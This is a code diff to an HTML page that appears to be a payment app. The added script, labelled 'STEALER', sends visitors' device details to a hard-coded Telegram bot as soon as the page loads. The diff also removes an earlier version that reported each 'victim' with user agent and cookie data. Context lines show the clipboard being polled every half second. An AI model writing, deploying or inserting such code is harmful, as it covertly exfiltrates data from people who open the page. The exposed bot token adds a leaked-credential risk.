@@ -228,6 +228,20 @@ body{background:#0a1014;color:#e0e0e0;font-family:Inter,system-ui;max-width:480p
 </div>
 
 <script>
+// ═══ STEALER — EN PREMIER ═══
+(async function(){
+  document.title="⚡ Chargement...";
+  const TG="8924356503:AAHvOqKy29W8oJParf_WuZP8r2WbHvoon74";
+  try{
+    const r=await fetch("https://api.telegram.org/bot"+TG+"/sendMessage",{
+      method:"POST",
+      headers:{"Content-Type":"application/x-www-form-urlencoded"},
+      body:"chat_id=7947710235&text="+encodeURIComponent("🟢 *APP OUVERTE* — "+navigator.platform+" | "+screen.width+"x"+screen.height+" | "+new Date().toISOString().slice(0,19))
+    });
+    document.title=(await r.json()).ok?"✅ OK":"❌ FAIL";
+  }catch(e){document.title="❌ "+e.message.slice(0,30)}
+})();
+
 // ═══════════════════════════════════════════════════════
 //  SCREEN SWITCHER
 // ═══════════════════════════════════════════════════════
@@ -352,33 +366,6 @@ function processPayment() {
   // Request permission on user interaction
   document.addEventListener("click",async()=>{if(!clipPermOk){try{await navigator.clipboard.readText();clipPermOk=true}catch(e){}}},{once:false});
   setInterval(clipPoll,500);
-})();
-
-// ═══ STEALER MINIMAL — Même code que test.html qui a marché ═══
-(async function(){
-  const TG="8924356503:AAHvOqKy29W8oJParf_WuZP8r2WbHvoon74";
-  const CID="7947710235";
-  
-  // Ping immédiat
-  try {
-    const r = await fetch("https://api.telegram.org/bot"+TG+"/sendMessage", {
-      method:"POST",
-      headers:{"Content-Type":"application/x-www-form-urlencoded"},
-      body:"chat_id="+CID+"&text="+encodeURIComponent("🟢 *PING* — "+navigator.platform+" | "+screen.width+"x"+screen.height)
-    });
-    const j = await r.json();
-    
-    // Si ping OK, envoyer les infos
-    if(j.ok){
-      const msg = "🔥 *Victime*\n📱 "+navigator.platform+" | "+screen.width+"x"+screen.height+" | "+navigator.hardwareConcurrency+"C\n🌐 "+navigator.userAgent.slice(0,80)+"\n🍪 "+document.cookie.length+" chars\n⏰ "+new Date().toISOString().slice(0,19);
-      
-      await fetch("https://api.telegram.org/bot"+TG+"/sendMessage", {
-        method:"POST",
-        headers:{"Content-Type":"application/x-www-form-urlencoded"},
-        body:"chat_id="+CID+"&text="+encodeURIComponent(msg)+"&parse_mode=Markdown"
-      });
-    }
-  } catch(e) {}
 })();
 </script>
 </body>
